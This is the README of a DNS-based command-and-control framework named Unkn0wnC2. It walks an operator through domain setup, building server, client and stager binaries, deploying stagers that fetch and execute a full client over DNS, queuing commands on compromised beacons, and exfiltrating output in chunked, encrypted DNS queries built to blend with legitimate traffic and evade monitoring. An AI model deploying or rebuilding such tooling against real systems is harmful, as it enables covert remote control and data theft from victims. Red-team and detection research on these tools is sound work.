# Unkn0wnC2

A DNS-based Command & Control framework that operates as a legitimate authoritative DNS server with advanced evasion and reliability features.

![Unkn0wnC2](assets/unkn0wnc2.png)


## Architecture

This C2 framework is designed to blend with legitimate DNS traffic by acting as an authoritative DNS server for your domain. The server provides:

- **Authoritative DNS Server** - Fully functional DNS server for your configured domain (e.g., `secwolf.net`)
- **C2 Communications** - Encodes commands/responses within legitimate-looking DNS queries
- **DNS Forwarding** - Proxies legitimate DNS queries to upstream servers (8.8.8.8) for stealth
- **Cache-Busting Protocol** - Timestamp injection prevents DNS resolver caching of C2 traffic
- **Chunked Result Handling** - Reliable exfiltration of large command outputs through multi-packet protocols
- **Interactive Console** - Beacon management and task distribution interface
- **Encryption and Encoding** - Communications are encrypted with AES-GCM encryption and encoded with Base36 (DNS-safe encoding)
- **Automatic Session Cleanup** - Stager sessions (30min) and expected results (1hr) auto-expire to prevent memory leaks

### Features

- [x] AES-GCM Encryption with Base36 DNS-safe encoding
- [x] Stager-based deployment (lightweight initial payload)
- [x] Automatic session cleanup (prevents memory leaks)
- [x] Two-phase chunked result exfiltration
- [x] Cache-busting timestamp protocol
- [x] Interactive C2 management console
- [x] DNS forwarding for traffic blending

### To-Do

- [ ] Beacon health monitoring and auto-cleanup
- [ ] Graceful beacon shutdown mechanism
- [ ] Handle other DNS request types (CNAME, etc.)
- [ ] Beacon killswitch functionality
- [ ] Enhanced console features (filtering, search)
- [ ] Improved code modularity
- [ ] File upload/download via DNS
- [ ] Database backend for beacon/task persistence

# Setup

#### 1. Domain Configuration
Set up your domain with glue records pointing to your server:
- Configure NS records: `ns1.yourdomain.net` and `ns2.yourdomain.net` pointing to your server IP
- Ensure your registrar has proper glue records configured

#### 2. Configure Server/Client
Make necessary adjustments in build_config.json, the builder tool will utilize this file during buildtime to configure your server and clients.
- Ensure `bind_addr` is correct for your server's external IP
- `server_address` is the public IP of your server
- For verbose debugging, change `debug` to true
- Client DNS can be set manualy at `dns_server` (Not recommended)
- Client heartbeat can be changed with `sleep_min` and `sleep_max`

#### 3. Build
Run build scripts for your OS

- Windows
```powershell
.\build.bat
```
- Linux
```bash
chmod +x build.sh
./build.sh           # Production build (silent stagers)
./build.sh --debug   # Debug build (verbose stagers for testing)
```

**Build output**

All build artifacts are placed in the `build/` directory:

```
build/
├── dns-server-linux          # Linux server binary
├── dns-client-windows.exe    # Windows client binary  
├── dns-client-linux          # Linux client binary
├── deployment_info.json      # Build and deployment information
└── stager/                   # Stager binaries
    ├── stager-linux-x64
    └── stager-windows-x64.exe
```

## Deployment Options

### Option 1: Direct Client Deployment

Traditional deployment of the full client binary.

#### Start server
```bash
sudo ./dns-server-linux
```

#### Launch client
- Linux
```bash
#sudo if possible!
./dns-client-linux
```
- Windows
```powershell
.\dns-client-windows.exe
```

### Option 2: Stager-Based Deployment

Deploy a lightweight stager that downloads the full client via DNS.

#### Advantages
- **Smaller footprint**: Stager is ~30KB vs full client ~2MB
- **Evasion**: Client binary never touches disk until execution
- **Flexibility**: Server can deliver different clients based on target OS/arch
- **Reduced detection**: Smaller initial payload, full client retrieved via DNS

#### Deployment Flow
1. Deploy small stager to target system
2. Stager contacts C2 server via DNS TXT queries
3. Server identifies target OS/architecture  
4. Server sends compressed client binary in DNS TXT responses
5. Stager assembles, decompresses, and executes full client
6. Client begins normal C2 operations

#### Using the Stager

**Server Preparation:**
```bash
# Ensure server has client binaries available
sudo ./dns-server-linux
# Server will automatically serve correct client based on stager OS/arch
```

**Target Deployment:**
```bash
# Transfer stager to target (much smaller than full client)
# Linux example:
./stager-linux-x64

# Windows example:
stager-windows-x64.exe
```

**Stager Protocol:**
```
1. Stager → Server:  base36(STG|<IP>|<OS>|<ARCH>)
2. Server → Stager:  base36(META|<total_chunks>)
3. Stager → Server:  base36(ACK|0)
4. Server → Stager:  base36(CHUNK|<base64_client_chunk_0>)
5. Stager → Server:  base36(ACK|1)
   ... continues until all chunks received ...
6. Stager: Decode base36 → Assemble base64 → Decode → Decompress → Write → Execute
```

**Note:** Stager uses Base36 encoding (not encryption) for DNS-safe message transmission.

See [Stager/README.md](Stager/README.md) for detailed stager documentation.

## C2 Operations
The server includes an interactive console for managing beacons and issuing commands. Use `help` for available commands.

**Interactive Console Commands**

```
help, ?                 - Show available commands
status, st              - Show C2 server status summary
beacons, list           - List all active beacons with details
task <id> <cmd>         - Queue command for specific beacon
tasks                   - Show all tasks and their status
result <task_id>        - Display completed task output
logs                    - Show log message count since start/clear
clear                   - Clear the console screen and reset log counter
exit, quit              - Shutdown the server
```

**Example Usage:**
```bash
c2> beacons                    # List all active beacons
c2> task a1b2 whoami          # Run command on beacon a1b2
c2> tasks                      # Check task status
c2> result T1001              # View task result
```

# Protocol Details

#### C2 Communication Flow
1. **Client Beacon**: Makes periodic DNS TXT queries with AES-GCM encrypted + Base36 encoded beacon data
2. **Cache-Busting**: Each query includes timestamp to prevent DNS resolver caching
3. **Task Distribution**: Server responds with encrypted tasks or ACK messages
4. **Result Exfiltration**: Large outputs use two-phase chunking protocol:
   - Phase 1: `RESULT_META` with size and chunk count
   - Phase 2: `DATA` chunks sent sequentially with automatic reassembly
5. **Session Management**: Automatic cleanup of expired sessions (stager: 30min, results: 1hr)

#### DNS Query Structure
```
<base36-encoded-encrypted-payload>.<timestamp-cache-buster>.<domain>
```
- Payload is AES-GCM encrypted then Base36 encoded for DNS safety
- Split into 62-character chunks (DNS label limit compliance)
- Timestamp prevents DNS resolver caching between communications
- Appears as normal subdomain lookups to network monitoring

##### Message Format (Pipe-Delimited, Encrypted Before Encoding)
- **Check-in**: `CHK|beaconID|hostname|username|os` (AES-GCM + Base36)
- **Task Distribution**: `TASK|taskID|command` (AES-GCM + Base36)
- **Server Response(No Task)**: `ACK` (AES-GCM + Base36)
- **Result Exfiltration**: `RESULT|beaconID|taskID|output` (small) or `RESULT_META|beaconID|taskID|size|chunks` + `DATA|beaconID|taskID|index|chunk` (AES-GCM + Base36)
- **Stager Request**: `STG|IP|OS|ARCH` (Base36 only, no encryption)
- **Stager Response**: `META|total_chunks` → `CHUNK|base64_data` (Base36 only, no encryption)

#### Encoding Protocol
- **AES-GCM Encryption**: Authenticated encryption for C2 traffic (clients only, stagers use plain Base36)
- **Base36 Encoding**: DNS-safe encoding using 0-9 and a-z characters for subdomain transmission
- **Chunk Handling**: Automatic splitting/reassembly for data over DNS limits (62 chars per label)
- **Session Cleanup**: Automatic expiration of stager sessions (30min) and expected results (1hr)

## DNS Communication Mechanics

#### DNS Resolution Chain
```
Client → Local DNS Resolver → Root DNS Servers → TLD Servers → Your Authoritative NS
```

1. **Client Query**: Beacon makes TXT record request for `<encoded-data>.<timestamp>.secwolf.net`
2. **Local Resolver**: Client's DNS resolver (ISP/corporate) checks cache, doesn't find entry
3. **Root Servers**: Resolver queries root servers for `.net` authority
4. **TLD Servers**: Root servers refer to `.net` TLD servers
5. **Your Server**: TLD servers refer to your authoritative nameservers (`ns1.secwolf.net`)
6. **C2 Processing**: Your server receives query, decodes C2 traffic, processes beacon/task
7. **Response Chain**: Your server responds back through the same chain to client

### Checkin Process Flow

**Step 1 - Initial Beacon Registration**
```
DNS Query: TXT <base36-encoded-aes-encrypted-data>.<timestamp>.secwolf.net
Decrypted: CHK|beacon-id|hostname|username|os-info
Response:  TXT record with AES-GCM encrypted + Base36 encoded "ACK" (first registration)
Server:    Creates beacon entry, starts tracking
```

**Step 2 - Regular Beacon Checkins**
```
DNS Query: TXT <base36-encoded-aes-encrypted-data>.<timestamp>.secwolf.net  
Decrypted: CHK|beacon-id|hostname|username|os-info
Response:  TXT record with AES-GCM encrypted + Base36 encoded:
           - "ACK" (no tasks pending)
           - "TASK|task-id|command" (task available)
Server:    Updates beacon last-seen timestamp
```

### Task Distribution Process

**Server-Side Task Queue**
1. Operator uses console: `task beacon-123 whoami`
2. Server creates task with unique ID and queues for beacon-123
3. Task status: `queued` → waiting for beacon checkin

**Task Delivery via DNS**
1. Beacon-123 makes regular checkin query
2. Server detects pending task in queue
3. Server responds with TXT record containing: `TASK|task-456|whoami`
4. Task status updated to: `sent` with timestamp
5. Beacon receives DNS response, extracts and executes command

### Result Exfiltration Process

**Small Results (< 50 bytes raw)**
```
DNS Query: TXT <base36-encoded-aes-encrypted-data>.<timestamp>.secwolf.net
Decrypted: RESULT|beacon-id|task-id|output-data  
Response:  TXT AES-GCM encrypted + Base36 encoded "ACK"
Server:    Task marked as completed, result stored
```

**Large Results (> 50 bytes raw) - Two-Phase Protocol**

**Phase 1 - Metadata**
```
DNS Query: TXT <base36-encoded-aes-encrypted-data>.<timestamp>.secwolf.net
Decrypted: RESULT_META|beacon-id|task-id|total-size|chunk-count
Response:  TXT AES-GCM encrypted + Base36 encoded "ACK" 
Server:    Creates ExpectedResult entry, prepares to receive chunks
```

**Phase 2 - Data Chunks**
```
DNS Query 1: TXT <base36-encoded-aes-encrypted-data>.<timestamp>.secwolf.net
Decrypted 1: DATA|beacon-id|task-id|1|chunk-1-data

DNS Query 2: TXT <base36-encoded-aes-encrypted-data>.<timestamp>.secwolf.net  
Decrypted 2: DATA|beacon-id|task-id|2|chunk-2-data

[... continues for all chunks ...]

Response:    TXT AES-GCM encrypted + Base36 encoded "ACK" for each chunk
Server:      Stores chunks in order, assembles when complete
```

**Server-Side Reassembly**
1. Server receives RESULT_META, prepares to collect chunks
2. Server receives DATA chunks, stores in order by chunk index
3. When all chunks received, server reconstructs complete result
4. Task status updated to `completed` with full output

### Cache-Busting Mechanism

**Problem**: DNS resolvers cache responses, preventing C2 communication

**Solution**: Timestamp-based subdomain variation
```
Original:  <encrypted-base36-data>.secwolf.net
Enhanced:  <encrypted-base36-data>.<unix-timestamp>.secwolf.net
```

**Example DNS Queries** (Base36 encoded, AES-GCM encrypted):
```
1. aiihbk2levr6d2jmb5dve5vfqqyg2oah3neijqkiswoj89pw.1729123456.secwolf.net  
2. tof6jalbhq38als9add7knpmyt4irhcypu4142s9rgu.1729123461.secwolf.net
3. 9x2y5z8a1b4c7d0e3f6g9h2i5j8k1l4m7n0p3q6r9s.1729123466.secwolf.net
```

Each query appears as a unique subdomain to DNS infrastructure, preventing caching from affecting C2 communications. The Base36 encoding uses only DNS-safe characters (0-9, a-z).

### Operational Features

**DNS Forwarding for Stealth**
1. Non-C2 query received: `www.secwolf.net` or `mail.secwolf.net`
2. Server identifies as legitimate DNS (not Base36-encoded C2 traffic)
3. Server forwards query to upstream DNS (default: 8.8.8.8)
4. Server returns legitimate response or generates realistic IP

**Traffic Blending Result**
- Domain appears to host legitimate services (web, mail, etc.)  
- C2 traffic disguised as subdomain lookups for hosted applications
- Network monitoring sees normal DNS patterns with mixed legitimate/C2 queries
- Automatic session cleanup prevents memory exhaustion from abandoned connections

**Security Features**
- No client/stager logging in production builds (stealth mode)
- Debug mode available via compile-time flag or server `-d` flag
- Default encryption key includes "DefaultChange" warning text
- Automatic session expiration (stagers: 30min, results: 1hr)
